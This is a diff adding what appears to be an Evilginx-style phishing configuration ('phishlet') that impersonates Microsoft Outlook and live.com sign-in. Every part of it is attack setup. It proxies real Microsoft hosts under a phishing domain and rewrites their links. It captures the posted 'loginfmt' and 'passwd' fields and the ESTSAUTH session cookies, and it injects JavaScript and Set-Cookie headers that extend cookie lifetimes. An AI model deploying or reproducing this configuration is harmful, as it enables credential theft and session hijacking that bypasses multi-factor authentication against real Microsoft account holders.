@@ -1,0 +1,54 @@
+name: outlook
+author: redteam-devin
+min_ver: 2.3.0
+
+proxy_hosts:
+  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'live.com', session: true, is_landing: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoft.com', session: false, is_landing: false}
+  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'office.com', session: false, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'outlook.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://outlook.live.com', replace: 'https://outlook.__PHISHING_DOMAIN__', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'outlook.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'outlook.live.com', replace: 'outlook.__PHISHING_DOMAIN__', mimes: ['text/html', 'application/javascript']}
+
+auth_tokens:
+  - domain: '.live.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
+  - domain: '.outlook.live.com'
+    keys: ['MSCC', 'MSPOK']
+
+credentials:
+  username:
+    key: 'loginfmt'
+    search: 'loginfmt'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: 'passwd'
+    type: 'post'
+
+login:
+  domain: 'outlook.live.com'
+  path: '/'
+
+logout:
+  domain: 'outlook.live.com'
+  path: '/logout'
+
+force_post:
+  - path: '/login'
+
+js_inject:
+  - trigger_domains: ['outlook.live.com']
+    script: |
+      document.cookie.split(";").forEach(function(c) {
+        document.cookie = c.replace(/^ +/, "")
+          .replace(/=.*/, "=;expires=" + new Date(Date.now()+31536000000).toUTCString() + ";path=/");
+      });
+
+http_response_modifier:
+  - trigger_domains: ['outlook.live.com']
+    headers:
+      - key: 'Set-Cookie'
+        value: 'Max-Age=31536000; SameSite=None; Secure'
